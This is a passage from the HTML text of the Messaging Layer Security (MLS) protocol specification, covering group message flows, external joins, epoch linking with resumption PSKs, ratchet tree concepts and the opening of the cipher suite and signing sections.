<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="240" text-anchor="middle" version="1.1" viewBox="0 0 520 240" width="520">
                <path d="M 8,64 L 8,224" fill="none" stroke="black"></path>
                <path d="M 128,64 L 128,168" fill="none" stroke="black"></path>
                <path d="M 128,184 L 128,224" fill="none" stroke="black"></path>
                <path d="M 248,64 L 248,168" fill="none" stroke="black"></path>
                <path d="M 248,200 L 248,224" fill="none" stroke="black"></path>
                <path d="M 368,64 L 368,104" fill="none" stroke="black"></path>
                <path d="M 368,120 L 368,168" fill="none" stroke="black"></path>
                <path d="M 488,64 L 488,224" fill="none" stroke="black"></path>
                <path d="M 248,112 L 480,112" fill="none" stroke="black"></path>
                <path d="M 16,176 L 488,176" fill="none" stroke="black"></path>
                <path d="M 136,192 L 488,192" fill="none" stroke="black"></path>
                <path d="M 256,208 L 488,208" fill="none" stroke="black"></path>
                <polygon fill="black" points="488,112 476,106.4 476,117.6" transform="rotate(0,480,112)"></polygon>
                <polygon fill="black" points="264,208 252,202.4 252,213.6" transform="rotate(180,256,208)"></polygon>
                <polygon fill="black" points="144,192 132,186.4 132,197.6" transform="rotate(180,136,192)"></polygon>
                <polygon fill="black" points="24,176 12,170.4 12,181.6" transform="rotate(180,16,176)"></polygon>
                <g>
                  <text x="488" y="36">Group</text>
                  <text x="8" y="52">A</text>
                  <text x="128" y="52">B</text>
                  <text x="184" y="52">...</text>
                  <text x="248" y="52">Z</text>
                  <text x="368" y="52">Directory</text>
                  <text x="488" y="52">Channel</text>
                  <text x="296" y="84">Remove(B)</text>
                  <text x="304" y="100">Commit(Rem)</text>
                  <text x="416" y="148">Remove(B)</text>
                  <text x="424" y="164">Commit(Rem)</text>
                  <text x="368" y="228">|</text>
                </g>
              </svg><p><a href="#section-3.2-15.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-5">Figure 5</a>:
<a href="#name-client-z-removes-client-b-f">Client Z removes client B from the group</a>
          </figcaption></figure>
</div>
<p id="section-3.2-16">Note that the flows in this section are examples; applications can arrange
message flows in other ways.  For example:<a href="#section-3.2-16">¬∂</a></p>
<ul>
<li id="section-3.2-17.1">Welcome messages don't necessarily need to be sent directly to new joiners.
Since they are encrypted to new joiners, they could be distributed more
broadly, say if the application only had access to a broadcast channel for the
group.<a href="#section-3.2-17.1">¬∂</a>
</li>
          <li id="section-3.2-17.2">Proposal messages don't need to be immediately sent to all group members.  They need to
be available to the committer before generating a Commit, and to other members before
processing the Commit.<a href="#section-3.2-17.2">¬∂</a>
</li>
          <li id="section-3.2-17.3">The sender of a Commit doesn't necessarily have to wait to receive its own
Commit back before advancing its state. It only needs to know that its Commit
will be the next one applied by the group, say based on a promise from an
orchestration server.<a href="#section-3.2-17.3">¬∂</a>
</li>
        </ul>
</section>
<section id="external-joins">
        <h3 id="name-external-joins">
<a href="#section-3.3">3.3. </a><a href="#name-external-joins">External Joins</a>
        </h3>
<p id="section-3.3-1">In addition to the Welcome-based flow for adding a new member to the group, it
is also possible for a new member to join by means of an "external Commit".
This mechanism can be used when the existing members don't have a KeyPackage for
the new member, for example, in the case of an "open" group that can be joined
by new members without asking permission from existing members.<a href="#section-3.3-1">¬∂</a></p>
<p id="section-3.3-2"><a href="#groupinfo-flow">Figure 6</a> shows a typical  message flow for an external join. To enable
a new member to join the group in this way, a member of the group (A, B)
publishes a GroupInfo object that includes the GroupContext for the group as
well as a public key that can be used to encrypt a secret to the existing
members of the group.  When the new member Z wishes to join, they download the
GroupInfo object and use it to form a Commit of a special form that adds Z to
the group (as detailed in <a href="#joining-via-external-commits">Section 12.4.3.2</a>).  The existing
members of the group process this external Commit in a similar way to a normal
Commit, advancing to a new epoch in which Z is now a member of the group.<a href="#section-3.3-2">¬∂</a></p>
<span id="name-client-a-publishes-a-groupi"></span><div id="groupinfo-flow">
<figure id="figure-6">
          <div id="section-3.3-3.1">
<pre>                                                          Group
A              B              Z          Directory        Channel
|              |              |              |              |
| GroupInfo    |              |              |              |
+-------------------------------------------&gt;|              |
|              |              | GroupInfo    |              |
|              |              |&lt;-------------+              |
|              |              |              |              |
|              |              | Commit(ExtZ) |              |
|              |              +----------------------------&gt;|
|              |              |              | Commit(ExtZ) |
|&lt;----------------------------------------------------------+
|              |&lt;-------------------------------------------+
|              |              |&lt;----------------------------+
|              |              |              |              |
</pre>
</div>
<figcaption><a href="#figure-6">Figure 6</a>:
<a href="#name-client-a-publishes-a-groupi">Client A publishes a GroupInfo object, and Client Z uses it to join the group</a>
          </figcaption></figure>
</div>
</section>
<section id="relationships-between-epochs">
        <h3 id="name-relationships-between-epoch">
<a href="#section-3.4">3.4. </a><a href="#name-relationships-between-epoch">Relationships between Epochs</a>
        </h3>
<p id="section-3.4-1">A group has a single linear sequence of epochs. Groups and epochs are generally
independent of one another. However, it can sometimes be useful to link epochs
cryptographically, either within a group or across groups. MLS derives a
resumption pre-shared key (PSK) from each epoch to allow entropy extracted from
one epoch to be injected into a future epoch.  A group member that wishes to
inject a PSK issues a PreSharedKey proposal (<a href="#presharedkey">Section 12.1.4</a>) describing the
PSK to be injected.  When this proposal is committed, the corresponding PSK will
be incorporated into the key schedule as described in <a href="#pre-shared-keys">Section 8.4</a>.<a href="#section-3.4-1">¬∂</a></p>
<p id="section-3.4-2">Linking epochs in this way
guarantees that members entering the new epoch agree on a key if and only if
they were members of the group during the epoch from which the resumption key
was extracted.<a href="#section-3.4-2">¬∂</a></p>
<p id="section-3.4-3">MLS supports two ways to tie a new group to an existing group, which are illustrated in
Figures <a href="#psk-reinit">7</a> and <a href="#psk-branch">8</a>. Reinitialization
closes one group and creates a new group comprising the same members with
different parameters. Branching starts a new group with a subset of the original
group's participants (with no effect on the original group).  In both cases,
the new group is linked to the old group via a resumption PSK.<a href="#section-3.4-3">¬∂</a></p>
<span id="name-reinitializing-a-group"></span><div id="psk-reinit">
<figure id="figure-7">
          <div id="section-3.4-4.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="240" text-anchor="middle" version="1.1" viewBox="0 0 272 240" width="272">
                <path d="M 48,40 L 48,112" fill="none" stroke="black"></path>
                <path d="M 224,136 L 224,208" fill="none" stroke="black"></path>
                <path d="M 56,80 L 72,80" fill="none" stroke="black"></path>
                <polygon fill="black" points="232,208 220,202.4 220,213.6" transform="rotate(90,224,208)"></polygon>
                <polygon fill="black" points="64,80 52,74.4 52,85.6" transform="rotate(180,56,80)"></polygon>
                <polygon fill="black" points="56,112 44,106.4 44,117.6" transform="rotate(90,48,112)"></polygon>
                <g>
                  <text x="56" y="36">epoch_A_[n-1]</text>
                  <text x="108" y="84">ReInit</text>
                  <text x="48" y="132">epoch_A_[n]</text>
                  <text x="224" y="132">epoch_B_[0]</text>
                  <text x="48" y="148">.</text>
                  <text x="48" y="164">.</text>
                  <text x="136" y="164">PSK(usage=reinit)</text>
                  <text x="132" y="180">.....................&gt;</text>
                  <text x="224" y="228">epoch_B_[1]</text>
                </g>
              </svg><p><a href="#section-3.4-4.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-7">Figure 7</a>:
<a href="#name-reinitializing-a-group">Reinitializing a Group</a>
          </figcaption></figure>
</div>
<span id="name-branching-a-group"></span><div id="psk-branch">
<figure id="figure-8">
          <div id="section-3.4-5.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="144" text-anchor="middle" version="1.1" viewBox="0 0 272 144" width="272">
                <path d="M 48,40 L 48,112" fill="none" stroke="black"></path>
                <path d="M 224,40 L 224,112" fill="none" stroke="black"></path>
                <polygon fill="black" points="232,112 220,106.4 220,117.6" transform="rotate(90,224,112)"></polygon>
                <polygon fill="black" points="56,112 44,106.4 44,117.6" transform="rotate(90,48,112)"></polygon>
                <g>
                  <text x="48" y="36">epoch_A_[n]</text>
                  <text x="224" y="36">epoch_B_[0]</text>
                  <text x="136" y="68">PSK(usage=branch)</text>
                  <text x="136" y="84">....................&gt;</text>
                  <text x="56" y="132">epoch_A_[n+1]</text>
                  <text x="224" y="132">epoch_B_[1]</text>
                </g>
              </svg><p><a href="#section-3.4-5.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-8">Figure 8</a>:
<a href="#name-branching-a-group">Branching a Group</a>
          </figcaption></figure>
</div>
<p id="section-3.4-6">Applications may also choose to use resumption PSKs to link epochs in other
ways.  For example, <a href="#psk-reinject">Figure 9</a> shows a case where a resumption PSK
from epoch <code>n</code> is injected into epoch <code>n+k</code>.  This demonstrates that the members
of the group at epoch <code>n+k</code> were also members at epoch <code>n</code>, irrespective of any
changes to these members' keys due to Updates or Commits.<a href="#section-3.4-6">¬∂</a></p>
<span id="name-reinjecting-entropy-from-an"></span><div id="psk-reinject">
<figure id="figure-9">
          <div id="section-3.4-7.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="304" text-anchor="middle" version="1.1" viewBox="0 0 248 304" width="248">
                <path d="M 48,40 L 48,176" fill="none" stroke="black"></path>
                <path d="M 48,200 L 48,272" fill="none" stroke="black"></path>
                <polygon fill="black" points="56,272 44,266.4 44,277.6" transform="rotate(90,48,272)"></polygon>
                <polygon fill="black" points="56,176 44,170.4 44,181.6" transform="rotate(90,48,176)"></polygon>
                <g>
                  <text x="48" y="36">epoch_A_[n]</text>
                  <text x="156" y="68">PSK(usage=application)</text>
                  <text x="136" y="84">.....................</text>
                  <text x="216" y="100">.</text>
                  <text x="216" y="116">.</text>
                  <text x="40" y="132">.</text>
                  <text x="56" y="132">.</text>
                  <text x="216" y="132">...</text>
                  <text x="216" y="148">.</text>
                  <text x="216" y="164">.</text>
                  <text x="216" y="180">.</text>
                  <text x="64" y="196">epoch_A_[n+k-1]</text>
                  <text x="216" y="196">.</text>
                  <text x="216" y="212">.</text>
                  <text x="216" y="228">.</text>
                  <text x="136" y="244">&lt;....................</text>
                  <text x="56" y="292">epoch_A_[n+k]</text>
                </g>
              </svg><p><a href="#section-3.4-7.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-9">Figure 9</a>:
<a href="#name-reinjecting-entropy-from-an">Reinjecting Entropy from an Earlier Epoch</a>
          </figcaption></figure>
</div>
</section>
</section>
<section id="ratchet-tree-concepts">
      <h2 id="name-ratchet-tree-concepts">
<a href="#section-4">4. </a><a href="#name-ratchet-tree-concepts">Ratchet Tree Concepts</a>
      </h2>
<p id="section-4-1">The protocol uses "ratchet trees" for deriving shared secrets among a group of
clients.  A ratchet tree is an arrangement of secrets and key pairs among the
members of a group in a way that allows for secrets to be efficiently updated to
reflect changes in the group.<a href="#section-4-1">¬∂</a></p>
<p id="section-4-2">Ratchet trees allow a group to efficiently remove any member by encrypting new
entropy to a subset of the group.  A ratchet tree assigns shared keys to
subgroups of the overall group, so that, for example, encrypting to all but one
member of the group requires only <code>log(N)</code> encryptions to subtrees, instead of the <code>N-1</code>
encryptions that would be needed to encrypt to each participant individually
(where N is the number of members in the group).<a href="#section-4-2">¬∂</a></p>
<p id="section-4-3">This remove operation allows MLS to efficiently achieve
post-compromise security.  In an Update proposal or a full Commit message, an old (possibly
compromised) representation of a member is efficiently removed from the group and
replaced with a freshly generated instance.<a href="#section-4-3">¬∂</a></p>
<section id="ratchet-tree-terminology">
        <h3 id="name-ratchet-tree-terminology">
<a href="#section-4.1">4.1. </a><a href="#name-ratchet-tree-terminology">Ratchet Tree Terminology</a>
        </h3>
<p id="section-4.1-1">Trees consist of <em>nodes</em>. A node is a
<em>leaf</em> if it has no children; otherwise, it is a <em>parent</em>.
All parents in our trees have precisely
two children, a <em>left</em> child and a <em>right</em> child. A node is the <em>root</em>
of a tree if it has no parent, and <em>intermediate</em> if it has both
children and a parent. The <em>descendants</em> of a node are that node's
children, and the descendants of its children.  We say a tree
<em>contains</em> a node if that node is a descendant of the root of the tree,
or if the node itself is the root of the tree. Nodes are <em>siblings</em> if they share the same parent.<a href="#section-4.1-1">¬∂</a></p>
<p id="section-4.1-2">A <em>subtree</em> of a tree is the tree given by any node (the <em>head</em> of the
subtree) and its descendants. The <em>size</em> of a tree or subtree is the
number of leaf nodes it contains.  For a given parent node, its <em>left
subtree</em> is the subtree with its left child as head and its
<em>right subtree</em> is the subtree with its right child as head.<a href="#section-4.1-2">¬∂</a></p>
<p id="section-4.1-3">Every tree used in this protocol is a perfect binary tree, that is, a complete
balanced binary tree with 2<sup>d</sup> leaves all at the same depth <code>d</code>.  This
structure is unique for a given depth <code>d</code>.<a href="#section-4.1-3">¬∂</a></p>
<p id="section-4.1-4">There are multiple ways that an implementation might represent a ratchet tree in
memory.  A convenient property of left-balanced binary trees (including the
complete trees used here) is that they can be represented as an array of nodes,
with node relationships computed based on the nodes' indices in the array.  A
more traditional representation based on linked node objects may also be used.
Appendices <a href="#array-based-trees">C</a> and <a href="#link-based-trees">D</a> provide some details on how to
implement the tree operations required for MLS in these representations.  MLS
places no requirements on implementations' internal representations of ratchet
trees.  An implementation may use any tree representation and associated
algorithms, as long as they produce correct protocol messages.<a href="#section-4.1-4">¬∂</a></p>
<section id="ratchet-tree-nodes">
          <h4 id="name-ratchet-tree-nodes">
<a href="#section-4.1.1">4.1.1. </a><a href="#name-ratchet-tree-nodes">Ratchet Tree Nodes</a>
          </h4>
<p id="section-4.1.1-1">Each leaf node in a ratchet tree is given an <em>index</em> (or <em>leaf index</em>), starting
at 0 from the left to 2<sup>d</sup> - 1 at the right (for a tree with 2<sup>d</sup> leaves). A tree
with 2<sup>d</sup> leaves has 2<sup>d+1</sup> - 1 nodes, including parent nodes.<a href="#section-4.1.1-1">¬∂</a></p>
<p id="section-4.1.1-2">Each node in a ratchet tree is either <em>blank</em> (containing no value) or it holds
an HPKE public key with some associated data:<a href="#section-4.1.1-2">¬∂</a></p>
<ul>
<li id="section-4.1.1-3.1">A public key (for the HPKE scheme in use; see <a href="#cipher-suites">Section 5.1</a>)<a href="#section-4.1.1-3.1">¬∂</a>
</li>
            <li id="section-4.1.1-3.2">A credential (only for leaf nodes; see <a href="#credentials">Section 5.3</a>)<a href="#section-4.1.1-3.2">¬∂</a>
</li>
            <li id="section-4.1.1-3.3">An ordered list of "unmerged" leaves (see <a href="#views">Section 4.2</a>)<a href="#section-4.1.1-3.3">¬∂</a>
</li>
            <li id="section-4.1.1-3.4">A hash of certain information about the node's parent, as of the last time the
node was changed (see <a href="#parent-hashes">Section 7.9</a>).<a href="#section-4.1.1-3.4">¬∂</a>
</li>
          </ul>
<p id="section-4.1.1-4">As described in <a href="#views">Section 4.2</a>, different members know different subsets of the set
of private keys corresponding to the public keys in nodes in the tree.  The
private key corresponding to a parent node is known only to members at leaf
nodes that are descendants of that node.  The private key corresponding to a leaf
node is known only to the member at that leaf node.  A leaf node is <em>unmerged</em>
relative to one of its ancestor nodes if the member at the leaf node does not
know the private key corresponding to the ancestor node.<a href="#section-4.1.1-4">¬∂</a></p>
<p id="section-4.1.1-5">Every node, regardless of whether the node is blank or populated, has
a corresponding <em>hash</em> that summarizes the contents of the subtree
below that node.  The rules for computing these hashes are described
in <a href="#tree-hashes">Section 7.8</a>.<a href="#section-4.1.1-5">¬∂</a></p>
<p id="section-4.1.1-6">The <em>resolution</em> of a node is an ordered list of non-blank nodes
that collectively cover all non-blank descendants of the node.
The resolution of the root contains the set of keys that are collectively necessary to
encrypt to every node in the group. The resolution
of a node is effectively a depth-first, left-first enumeration of the nearest
non-blank nodes below the node:<a href="#section-4.1.1-6">¬∂</a></p>
<ul>
<li id="section-4.1.1-7.1">The resolution of a non-blank node comprises the node itself,
followed by its list of unmerged leaves, if any.<a href="#section-4.1.1-7.1">¬∂</a>
</li>
            <li id="section-4.1.1-7.2">The resolution of a blank leaf node is the empty list.<a href="#section-4.1.1-7.2">¬∂</a>
</li>
            <li id="section-4.1.1-7.3">The resolution of a blank intermediate node is the result of
concatenating the resolution of its left child with the resolution
of its right child, in that order.<a href="#section-4.1.1-7.3">¬∂</a>
</li>
          </ul>
<p id="section-4.1.1-8">For example, consider the following subtree, where the <code>_</code> character
represents a blank node and unmerged leaves are indicated in square
brackets:<a href="#section-4.1.1-8">¬∂</a></p>
<span id="name-a-tree-with-blanks-and-unme"></span><div id="resolution-tree">
<figure id="figure-10">
            <div id="section-4.1.1-9.1">
<pre>               ...
               /
              _
        ______|______
       /             \
      X[B]            _
    __|__           __|__
   /     \         /     \
  _       _       Y       _
 / \     / \     / \     / \
A   B   _   D   E   F   _   H

0   1   2   3   4   5   6   7
</pre>
</div>
<figcaption><a href="#figure-10">Figure 10</a>:
<a href="#name-a-tree-with-blanks-and-unme">A Tree with Blanks and Unmerged Leaves</a>
            </figcaption></figure>
</div>
<p id="section-4.1.1-10">In this tree, we can see all of the above rules in play:<a href="#section-4.1.1-10">¬∂</a></p>
<ul>
<li id="section-4.1.1-11.1">The resolution of node X is the list [X, B].<a href="#section-4.1.1-11.1">¬∂</a>
</li>
            <li id="section-4.1.1-11.2">The resolution of leaf 2 or leaf 6 is the empty list [].<a href="#section-4.1.1-11.2">¬∂</a>
</li>
            <li id="section-4.1.1-11.3">The resolution of top node is the list [X, B, Y, H].<a href="#section-4.1.1-11.3">¬∂</a>
</li>
          </ul>
</section>
<section id="paths-through-a-ratchet-tree">
          <h4 id="name-paths-through-a-ratchet-tre">
<a href="#section-4.1.2">4.1.2. </a><a href="#name-paths-through-a-ratchet-tre">Paths through a Ratchet Tree</a>
          </h4>
<p id="section-4.1.2-1">The <em>direct path</em> of a root is the empty list. The direct path of any other node
is the concatenation of that node's parent along with the parent's direct path.<a href="#section-4.1.2-1">¬∂</a></p>
<p id="section-4.1.2-2">The <em>copath</em> of a node is the node's sibling concatenated with the list of
siblings of all the nodes in its direct path, excluding the root.<a href="#section-4.1.2-2">¬∂</a></p>
<p id="section-4.1.2-3">The <em>filtered direct path</em> of a leaf node L is the node's direct path, with any
node removed whose child on the copath of L has an empty resolution (keeping in
mind that any unmerged leaves of the copath child count toward its resolution).
The removed nodes do not need their own key pairs because encrypting to the
node's key pair would be equivalent to encrypting to its non-copath child.<a href="#section-4.1.2-3">¬∂</a></p>
<p id="section-4.1.2-4">For example, consider the following tree (where blank nodes are indicated with
<code>_</code>, but also assigned a label for reference):<a href="#section-4.1.2-4">¬∂</a></p>
<span id="name-a-complete-tree-with-five-m"></span><div id="full-tree">
<figure id="figure-11">
            <div id="section-4.1.2-5.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="240" text-anchor="middle" version="1.1" viewBox="0 0 256 240" width="256">
                  <path d="M 56,104 L 56,128" fill="none" stroke="black"></path>
                  <path d="M 120,48 L 120,64" fill="none" stroke="black"></path>
                  <path d="M 184,112 L 184,128" fill="none" stroke="black"></path>
                  <path d="M 72,64 L 168,64" fill="none" stroke="black"></path>
                  <path d="M 40,128 L 72,128" fill="none" stroke="black"></path>
                  <path d="M 168,128 L 200,128" fill="none" stroke="black"></path>
                  <path d="M 72,128 L 80,144" fill="none" stroke="black"></path>
                  <path d="M 92,168 L 96,176" fill="none" stroke="black"></path>
                  <path d="M 168,64 L 176,80" fill="none" stroke="black"></path>
                  <path d="M 200,128 L 208,144" fill="none" stroke="black"></path>
                  <path d="M 220,168 L 224,176" fill="none" stroke="black"></path>
                  <path d="M 32,144 L 40,128" fill="none" stroke="black"></path>
                  <path d="M 64,80 L 72,64" fill="none" stroke="black"></path>
                  <path d="M 80,176 L 84,168" fill="none" stroke="black"></path>
                  <path d="M 160,144 L 168,128" fill="none" stroke="black"></path>
                  <path d="M 208,176 L 212,168" fill="none" stroke="black"></path>
                  <g>
                    <text x="120" y="36">W</text>
                    <text x="136" y="36">=</text>
                    <text x="164" y="36">root</text>
                    <text x="64" y="100">_=U</text>
                    <text x="184" y="100">Y</text>
                    <text x="24" y="164">T</text>
                    <text x="96" y="164">_=V</text>
                    <text x="152" y="164">X</text>
                    <text x="224" y="164">_=Z</text>
                    <text x="16" y="180">/</text>
                    <text x="32" y="180">\</text>
                    <text x="144" y="180">/</text>
                    <text x="160" y="180">\</text>
                    <text x="8" y="196">A</text>
                    <text x="40" y="196">B</text>
                    <text x="72" y="196">_</text>
                    <text x="104" y="196">_</text>
                    <text x="136" y="196">E</text>
                    <text x="168" y="196">F</text>
                    <text x="200" y="196">G</text>
                    <text x="240" y="196">_=H</text>
                    <text x="8" y="228">0</text>
                    <text x="40" y="228">1</text>
                    <text x="72" y="228">2</text>
                    <text x="104" y="228">3</text>
                    <text x="136" y="228">4</text>
                    <text x="168" y="228">5</text>
                    <text x="200" y="228">6</text>
                    <text x="232" y="228">7</text>
                  </g>
                </svg><p><a href="#section-4.1.2-5.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-11">Figure 11</a>:
<a href="#name-a-complete-tree-with-five-m">A Complete Tree with Five Members, with Labels for Blank Parent Nodes</a>
            </figcaption></figure>
</div>
<p id="section-4.1.2-6">In this tree, the direct paths, copaths, and filtered direct paths for the leaf
nodes are as follows:<a href="#section-4.1.2-6">¬∂</a></p>
<table id="table-2">
            <caption><a href="#table-2">Table 2</a></caption>
<thead>
              <tr>
                <th rowspan="1" colspan="1">Node</th>
                <th rowspan="1" colspan="1">Direct path</th>
                <th rowspan="1" colspan="1">Copath</th>
                <th rowspan="1" colspan="1">Filtered Direct Path</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td rowspan="1" colspan="1">A</td>
                <td rowspan="1" colspan="1">T, U, W</td>
                <td rowspan="1" colspan="1">B, V, Y</td>
                <td rowspan="1" colspan="1">T, W</td>
              </tr>
              <tr>
                <td rowspan="1" colspan="1">B</td>
                <td rowspan="1" colspan="1">T, U, W</td>
                <td rowspan="1" colspan="1">A, V, Y</td>
                <td rowspan="1" colspan="1">T, W</td>
              </tr>
              <tr>
                <td rowspan="1" colspan="1">E</td>
                <td rowspan="1" colspan="1">X, Y, W</td>
                <td rowspan="1" colspan="1">F, Z, U</td>
                <td rowspan="1" colspan="1">X, Y, W</td>
              </tr>
              <tr>
                <td rowspan="1" colspan="1">F</td>
                <td rowspan="1" colspan="1">X, Y, W</td>
                <td rowspan="1" colspan="1">E, Z, U</td>
                <td rowspan="1" colspan="1">X, Y, W</td>
              </tr>
              <tr>
                <td rowspan="1" colspan="1">G</td>
                <td rowspan="1" colspan="1">Z, Y, W</td>
                <td rowspan="1" colspan="1">H, X, U</td>
                <td rowspan="1" colspan="1">Y, W</td>
              </tr>
            </tbody>
          </table>
</section>
</section>
<section id="views">
        <h3 id="name-views-of-a-ratchet-tree">
<a href="#section-4.2">4.2. </a><a href="#name-views-of-a-ratchet-tree">Views of a Ratchet Tree</a>
        </h3>
<p id="section-4.2-1">We generally assume that each participant maintains a complete and
up-to-date view of the public state of the group's ratchet tree,
including the public keys for all nodes and the credentials
associated with the leaf nodes.<a href="#section-4.2-1">¬∂</a></p>
<p id="section-4.2-2">No participant in an MLS group knows the private key associated with
every node in the tree. Instead, each member is assigned to a leaf of the tree,
which determines the subset of private keys it knows. The
credential stored at that leaf is one provided by the member.<a href="#section-4.2-2">¬∂</a></p>
<p id="section-4.2-3">In particular, MLS maintains the members' views of the tree in such
a way as to maintain the <em>tree invariant</em>:<a href="#section-4.2-3">¬∂</a></p>
<blockquote id="section-4.2-4">
          The private key for a node in the tree is known to a member of
          the group only if the node's subtree contains that member's leaf.<a href="#section-4.2-4">¬∂</a>
</blockquote>
<p id="section-4.2-5">In other words, if a node is not blank, then it holds a public key.
The corresponding private key is known only to members occupying
leaves below that node.<a href="#section-4.2-5">¬∂</a></p>
<p id="section-4.2-6">The reverse implication is not true: A member may not know the private key of
an intermediate node above them.  Such a member has an <em>unmerged</em> leaf at the
intermediate node.  Encrypting to an intermediate node requires encrypting to
the node's public key, as well as the public keys of all the unmerged leaves
below it.  A leaf is unmerged with regard to all of its ancestors when it is
first added, because the process of adding the leaf does not give it access to
the private keys for all of the nodes above it in the tree.  Leaves are "merged"
as they receive the private keys for nodes, as described in
<a href="#ratchet-tree-evolution">Section 7.4</a>.<a href="#section-4.2-6">¬∂</a></p>
<p id="section-4.2-7">For example, consider a four-member group (A, B, C, D) where the node above the
right two members is blank.  (This is what it would look like if A created a
group with B, C, and D.)  Then the public state of the tree and the views of the
private keys of the tree held by each participant would be as follows, where <code>_</code>
represents a blank node, <code>?</code> represents an unknown private key, and <code>pk(X)</code>
represents the public key corresponding to the private key <code>X</code>:<a href="#section-4.2-7">¬∂</a></p>
<div id="section-4.2-8">
<pre>         Public Tree
============================
            pk(ABCD)
          /          \
    pk(AB)            _
     / \             / \
pk(A)   pk(B)   pk(C)   pk(D)


 Private @ A       Private @ B       Private @ C       Private @ D
=============     =============     =============     =============
     ABCD              ABCD              ABCD              ABCD
    /   \             /   \             /   \             /   \
  AB      _         AB      _         ?       _         ?       _
 / \     / \       / \     / \       / \     / \       / \     / \
A   ?   ?   ?     ?   B   ?   ?     ?   ?   C   ?     ?   ?   ?   D
</pre><p><a href="#section-4.2-8">¬∂</a>
</p></div>
<p id="section-4.2-9">Note how the tree invariant applies: Each member knows only their own leaf,
the private key AB is known only to A and B, and the private key ABCD
is known to all four members. This also illustrates another important
point: it is possible for there to be "holes" on the path from a member's leaf
to the root in which the member knows the key both above and below
a given node, but not for that node, as in the case with D.<a href="#section-4.2-9">¬∂</a></p>
</section>
</section>
<section id="cryptographic-objects">
      <h2 id="name-cryptographic-objects">
<a href="#section-5">5. </a><a href="#name-cryptographic-objects">Cryptographic Objects</a>
      </h2>
<section id="cipher-suites">
        <h3 id="name-cipher-suites">
<a href="#section-5.1">5.1. </a><a href="#name-cipher-suites">Cipher Suites</a>
        </h3>
<p id="section-5.1-1">Each MLS session uses a single cipher suite that specifies the
following primitives to be used in group key computations:<a href="#section-5.1-1">¬∂</a></p>
<ul>
<li id="section-5.1-2.1">
            <p id="section-5.1-2.1.1">HPKE parameters:<a href="#section-5.1-2.1.1">¬∂</a></p>
<ul>
<li id="section-5.1-2.1.2.1">A Key Encapsulation Mechanism (KEM)<a href="#section-5.1-2.1.2.1">¬∂</a>
</li>
              <li id="section-5.1-2.1.2.2">A Key Derivation Function (KDF)<a href="#section-5.1-2.1.2.2">¬∂</a>
</li>
              <li id="section-5.1-2.1.2.3">An Authenticated Encryption with Associated Data (AEAD) encryption algorithm<a href="#section-5.1-2.1.2.3">¬∂</a>
</li>
            </ul>
</li>
          <li id="section-5.1-2.2">A hash algorithm<a href="#section-5.1-2.2">¬∂</a>
</li>
          <li id="section-5.1-2.3">A Message Authentication Code (MAC) algorithm<a href="#section-5.1-2.3">¬∂</a>
</li>
          <li id="section-5.1-2.4">A signature algorithm<a href="#section-5.1-2.4">¬∂</a>
</li>
        </ul>
<p id="section-5.1-3">MLS uses HPKE for public key encryption <span>[<a href="#RFC9180">RFC9180</a>]</span>.  The
<code>DeriveKeyPair</code> function associated to the KEM for the cipher suite maps octet
strings to HPKE key pairs.  As in HPKE, MLS assumes that an AEAD algorithm
produces a single ciphertext output from AEAD encryption (aligning with
<span>[<a href="#RFC5116">RFC5116</a>]</span>), as opposed to a separate ciphertext and tag.<a href="#section-5.1-3">¬∂</a></p>
<p id="section-5.1-4">Cipher suites are represented with the CipherSuite type. The cipher suites are
defined in <a href="#mls-cipher-suites">Section 17.1</a>.<a href="#section-5.1-4">¬∂</a></p>
<section id="public-keys">
          <h4 id="name-public-keys">
<a href="#section-5.1.1">5.1.1. </a><a href="#name-public-keys">Public Keys</a>
          </h4>
<p id="section-5.1.1-1">HPKE public keys are opaque values in a format defined by the underlying
protocol (see <span><a href="https://www.rfc-editor.org/rfc/rfc9180#section-4">Section 4</a> of [<a href="#RFC9180">RFC9180</a>]</span> for more information).<a href="#section-5.1.1-1">¬∂</a></p>
<div id="section-5.1.1-2">
<pre>opaque HPKEPublicKey&lt;V&gt;;
</pre><p><a href="#section-5.1.1-2">¬∂</a>
</p></div>
<p id="section-5.1.1-3">Signature public keys are likewise represented as opaque values in a format
defined by the cipher suite's signature scheme.<a href="#section-5.1.1-3">¬∂</a></p>
<div id="section-5.1.1-4">
<pre>opaque SignaturePublicKey&lt;V&gt;;
</pre><p><a href="#section-5.1.1-4">¬∂</a>
</p></div>
<p id="section-5.1.1-5">For cipher suites using the Edwards-curve Digital Signature Algorithm (EdDSA)
signature schemes (Ed25519 or Ed448), the public key is in the format specified
in <span>[<a href="#RFC8032">RFC8032</a>]</span>.<a href="#section-5.1.1-5">¬∂</a></p>
<p id="section-5.1.1-6">For cipher suites using the Elliptic Curve Digital Signature Algorithm (ECDSA)
with the NIST curves (P-256, P-384, or P-521), the public key is represented as
an encoded UncompressedPointRepresentation struct, as defined in <span>[<a href="#RFC8446">RFC8446</a>]</span>.<a href="#section-5.1.1-6">¬∂</a></p>
</section>
<section id="signing">
          <h4 id="name-signing">
<a href="#section-5.1.2">5.1.2. </a><a href="#name-signing">Signing</a>
          </h4>
<p id="section-5.1.2-1">The signature algorithm specified in a group's cipher suite is the mandatory algorithm
to be used for signing messages within the group.  It
<span>MUST</span> be the same as the signature algorithm specified in the credentials in the
leaves of the tree (including the leaf node information in KeyPackages used to
add new members).<a href="#section-5.1.2-1">¬∂</a></p>
<p id="section-5.1.2-2">The signatures used in this document are encoded as specified in <span>[<a href="#RFC8446">RFC8446</a>]</span>.
In particular, ECDSA signatures are DER encoded, and EdDSA signatures are defined
as the concatenation of <code>R</code> and <code>S</code>, as specified in <span>[<a href="#RFC8032">RFC8032</a>]</span>.<a href="#section-5.1.2-2">¬∂</a></p>
<p id="section-5.1.2-3">To disambiguate different signatures used in MLS, each signed value is prefixed
by a label as shown below:<a href="#section-5.1.2-3">¬∂</a></p>
<div id="section-5.1.2-4">
<pre>SignWithLabel(SignatureKey, Label, Content) =
    Signature.Sign(SignatureKey, SignContent)

